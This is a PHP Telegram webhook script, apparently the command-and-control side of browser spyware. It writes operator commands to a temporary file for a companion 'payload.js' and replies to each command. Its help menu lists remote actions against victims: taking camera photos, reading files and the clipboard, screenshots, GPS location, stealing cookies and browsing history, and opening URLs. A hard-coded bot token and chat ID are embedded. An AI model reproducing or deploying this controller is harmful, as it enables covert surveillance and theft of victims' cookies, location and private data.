<?php
// bot.php - Webhook Telegram pour commandes directes
$botToken = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
$chatId = '6767182328';

$content = file_get_contents('php://input');
$update = json_decode($content, true);

function sendMessage($chat_id, $message) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    file_get_contents($url . "?chat_id=$chat_id&text=" . urlencode($message));
}

if ($update && isset($update['message']['text'])) {
    $text = trim($update['message']['text']);
    $chat_id = $update['message']['chat']['id'];
    
    // Stocker la commande dans un fichier lisible par payload.js
    $commandFile = '/tmp/telegram_command.txt';
    file_put_contents($commandFile, $text);
    
    // Réponse immédiate
    switch($text) {
        case '/start':
        case '/help':
            sendMessage($chat_id, "🤖 BOT ACTIF\nCommandes:\n/camera - Photos\n/files - Accès fichiers\n/clipboard - Presse-papier\n/screenshot - Capture\n/location - GPS\n/cookies - Cookies\n/history - Historique\n/status - État\n/ping - Test\n/vibrate - Vibration\nnotify_custom:message\nurl:https://...");
            break;
        case '/camera':
            sendMessage($chat_id, "📷 Commande caméra envoyée");
            break;
        case '/files':
            sendMessage($chat_id, "📁 Bouton fichier va apparaître");
            break;
        case '/clipboard':
            sendMessage($chat_id, "📋 Lecture presse-papier");
            break;
        case '/screenshot':
            sendMessage($chat_id, "📸 Capture d'écran");
            break;
        case '/location':
            sendMessage($chat_id, "📍 Demande GPS");
            break;
        case '/cookies':
            sendMessage($chat_id, "🍪 Envoi des cookies");
            break;
        case '/status':
            sendMessage($chat_id, "📊 Demande de statut");
            break;
        case '/ping':
            sendMessage($chat_id, "🏓 Pong!");
            break;
        case '/vibrate':
            sendMessage($chat_id, "📳 Vibration");
            break;
        default:
            if (str_starts_with($text, 'notify_custom:')) {
                sendMessage($chat_id, "🔔 Notification: " . substr($text, 14));
            } elseif (str_starts_with($text, 'url:')) {
                sendMessage($chat_id, "🔗 URL ouverte: " . substr($text, 4));
            } else {
                sendMessage($chat_id, "❌ Commande inconnue. Tapez /help");
            }
    }
}
?>
